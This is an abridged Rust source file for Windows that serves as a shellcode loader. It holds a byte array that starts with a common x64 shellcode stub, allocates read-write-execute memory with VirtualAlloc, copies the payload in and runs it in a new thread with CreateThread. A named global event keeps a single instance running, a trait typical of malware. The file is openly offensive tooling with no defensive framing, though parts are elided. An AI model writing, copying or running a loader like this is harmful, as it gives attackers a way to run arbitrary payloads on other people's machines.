#[allow(deprecated)]
use std::{ffi::CStr, intrinsics::copy_nonoverlapping, mem::transmute, ptr::null_mut};

use winapi::{shared::winerror::ERROR_ALREADY_EXISTS, um::{errhandlingapi::GetLastError, memoryapi::VirtualAlloc, processthreadsapi::CreateThread, synchapi::{CreateEventA, CreateMutexA, CreateSemaphoreW, WaitForSingleObject}, winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE}}};

const BUF: &[u8] = &[0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,
...
fn inject() -> bool {
        ...
        let paddress = VirtualAlloc(null_mut(), BUF.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        ...
        let h_thread = CreateThread(null_mut(), 0, Some(transmute(paddress)), null_mut(), 0, &mut thread_id);

        println!("[+] Created thread with thread ID: {}", thread_id);
...
fn main() {
    ...
    unsafe {
        ...
        let h_event = CreateEventA(null_mut(), 0, 0, CStr::from_bytes_with_nul(b"Global\\MyUniqueEventName\0").unwrap().as_ptr());

        if h_event.is_null() {
            println!("[-] CreateEventA failed with error: {}", GetLastError());
            return;
        }

        if !h_event.is_null() && GetLastError() == ERROR_ALREADY_EXISTS {
            println!("[-] Another instance of the program is already running.");
            return;
        }
    }   
    ...
    if inject() {
        ...
        println!("[-] Shellcode execution failed.");
    }
